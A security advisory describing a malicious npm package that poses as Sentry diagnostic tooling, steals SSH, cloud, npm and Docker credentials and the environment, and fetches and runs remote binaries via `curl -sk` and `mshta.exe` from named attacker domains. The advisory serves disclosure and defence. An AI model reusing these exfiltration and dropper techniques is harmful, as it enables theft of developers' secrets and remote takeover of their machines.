summary: Credential exfiltration and remote dropper masquerading as Sentry diagnostic tool
details: The package ships a CLI (bin/scan-only.js) that impersonates Sentry diagnostic tooling. When invoked (e.g. via `npx scan-only --diagnose`) it reads installer secrets — ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.aws/credentials, ~/.npmrc, ~/.docker/config.json, ~/.gitconfig, shell histories, the full process.env, and network/process listings — and POSTs them to a hardcoded endpoint at https://sentry.citadel-casino.com/collect (a typosquat of sentry.io, unaffiliated with Sentry). A second component (execPayload) iterates a hardcoded fleet of attacker domains (sffcar.fr, lgaauto.fr, ngmauto.fr) and, on Linux/macOS, runs `curl -sk` (TLS verification disabled) to fetch an unverified binary into /tmp/.<random>, `chmod +x`, and nohup-executes it; on Windows it runs `mshta.exe https://<fleet>/api/agent` to execute a remote HTA. A covert command channel fetches https://sentry.citadel-casino.com/decoy and decodes a command hidden via first-letters-of-words steganography. The cover story (`console.log('Sentry Diagnostic Tools v1.2.0')`, User-Agent `citadel-diagnose/0.2.0`, sentry-prefixed C2 hostname) is designed to evade reviewers and EDR rules that allowlist Sentry telemetry.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
